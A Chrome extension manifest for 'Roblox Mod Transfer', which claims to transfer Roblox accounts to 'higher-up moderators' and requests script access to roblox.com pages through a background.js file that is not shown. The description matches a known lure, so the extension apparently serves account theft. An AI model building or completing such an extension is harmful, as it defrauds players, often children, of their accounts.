{
  "manifest_version": 3,
  "name": "Roblox Mod Transfer",
  "version": "1.0.0",
  "description": "Transfer Roblox accounts to higher-up moderators",
  "permissions": ["scripting", "activeTab"],
  "host_permissions": ["https://*.roblox.com/*"],
  "background": {
    "service_worker": "background.js"
  },
  "action": {
    "default_title": "Transfer Account"
  }
}
